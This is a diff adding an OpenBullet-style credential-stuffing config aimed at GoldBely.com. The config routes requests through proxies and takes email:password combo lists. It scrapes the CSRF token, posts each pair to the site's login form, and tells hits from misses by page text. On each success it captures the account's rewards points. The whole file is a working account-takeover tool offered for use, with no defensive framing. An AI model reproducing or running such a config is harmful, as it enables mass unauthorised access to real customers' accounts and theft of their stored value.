@@ -1,0 +1,56 @@
+[SETTINGS]
+{
+  "Name": "GoldBely.com",
+  "SuggestedBots": 1,
+  "LastModified": "2018-06-10T20:21:08.6982219+00:00",
+  "AdditionalInfo": "",
+  "Author": "Dreamzje [ KEEPIT.ONLINE ]",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_REQUEST REQUEST GET "https://www.goldbely.com/log-in" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_TOKEN PARSE "<SOURCE>" LR "csrf-token\" content=\"" "\"" Recursive=FALSE -> VAR "TOKEN" "" "" 
+#POST_REQUEST REQUEST POST "https://www.goldbely.com/log-in" AutoRedirect=TRUE 
+  CONTENT "utf8=✓&authenticity_token=<TOKEN>&email_auth[email]=<USER>&email_auth[password]=<PASS>&button=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Referer: https://www.goldbely.com/log-in" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Origin: https://www.goldbely.com" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Connection: keep-alive" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "
+Whoops, looks like the user/password was incorrect." 
+  KEYCHAIN Success OR 
+    KEY ">Sign Out
+<" 
+PARSE "<SOURCE>" LR "
+<div class='rewards-points__points'>
+" "
+</div>
+points" Recursive=FALSE -> CAP "Points" "" "" 
